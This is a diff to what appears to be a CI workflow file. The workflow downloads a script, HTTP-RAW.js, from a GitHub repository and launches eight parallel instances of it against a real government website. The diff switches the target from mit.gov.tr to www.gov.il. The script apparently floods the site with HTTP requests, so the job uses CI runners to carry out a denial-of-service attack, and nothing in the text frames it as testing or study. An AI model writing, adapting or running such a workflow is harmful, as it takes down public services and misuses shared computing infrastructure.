@@ -17,7 +17,7 @@ jobs:
           wget https://github.com/Xandermercado800/HTTP-RAWWW/raw/refs/heads/main/HTTP-RAW.js
           PIDS=()
           for i in {1..8}; do
-            sudo timeout 30 node HTTP-RAW.js https://mit.gov.tr/ 30 &
+            sudo timeout 30 node HTTP-RAW.js https://www.gov.il/ 30 &
             PIDS+=($!)
           done
           
